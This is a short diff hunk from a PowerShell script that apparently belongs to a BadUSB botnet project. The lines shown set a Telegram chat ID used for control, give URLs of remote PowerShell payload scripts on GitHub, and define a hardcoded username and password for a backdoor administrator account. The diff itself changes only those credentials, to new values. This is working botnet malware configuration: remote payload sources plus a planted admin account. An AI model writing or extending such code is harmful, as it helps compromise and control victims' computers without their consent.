@@ -5,8 +5,8 @@ $ChatID = '429367185'
 $githubScript = "https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1"
 # Gestion Creation Admin
 $ScriptAdmin = "https://raw.githubusercontent.com/Machiavel-QuadCore/BadUsb/main/test.ps1"
-$Username = "Bot_Machia"
-$Password = "QuadCore"
+$Username = "Bot_3-Machia"
+$Password = "QuadCore2K13"
 $lastProcessedUpdateID = 0
 
 $whoami = whoami
